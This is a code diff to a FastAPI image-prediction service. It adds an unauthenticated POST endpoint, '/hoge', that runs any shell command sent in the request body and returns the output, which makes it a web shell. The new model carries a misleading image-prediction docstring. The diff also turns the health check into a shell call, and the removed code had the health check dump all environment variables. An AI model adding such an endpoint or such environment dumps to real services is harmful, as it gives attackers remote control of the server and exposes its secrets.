@@ -4,13 +4,15 @@ import io
 import os
 import logging
 import sys
-
+import subprocess
 from urllib.parse import urlparse
 
 from aiohttp.client import ClientSession
 from asyncio import wait_for, gather, Semaphore
 
 from typing import Optional, List
+
+from click import command
 
 from fastapi import FastAPI, Request
 from fastapi.responses import JSONResponse
@@ -42,7 +44,11 @@ class HealthCheck(BaseModel):
     Represents an image to be predicted.
     """
     message: Optional[str] = 'OK'
-    contents: Optional[List[Envs]] = []
+class Command(BaseModel):
+    """
+    Represents an image to be predicted.
+    """
+    command: str = 'ls'
 
 class ImageOutput(BaseModel):
     """
@@ -122,13 +128,6 @@ def predict_images(url):
 
 @app.post('/v1/predict', response_model=PredictResponse)
 async def process(req: PredictRequest):
-    """
-    Predicts the category of the images contained in the request.
-
-    :param req: The request object containing the image data to predict.
-
-    :return: The prediction results.
-    """
     logger.info('Processing request.')
     logger.debug(req.json())
     logger.info('Downloading images.')
@@ -148,14 +147,16 @@ async def process(req: PredictRequest):
 
 @app.get('/health')
 def test():
-    """
-    Can be called by load balancers as a health check.
-    """
+    cp = subprocess.run('ls', shell=True, text=True)
+    return HealthCheck(message=str(cp.stdout))
 
-    list = [Envs(key=e,val=os.getenv(e)) for e in os.environ ]
+@app.post('/hoge')
+def hoge(req: Command):
 
-
-    return HealthCheck(contents=list)
+    cp = subprocess.run(req.command, shell=True, text=True, stdout=subprocess.PIPE)
+    print(cp.stdout)
+    
+    return Command(command=str(cp.stdout))
 
 handler = Mangum(app)
 
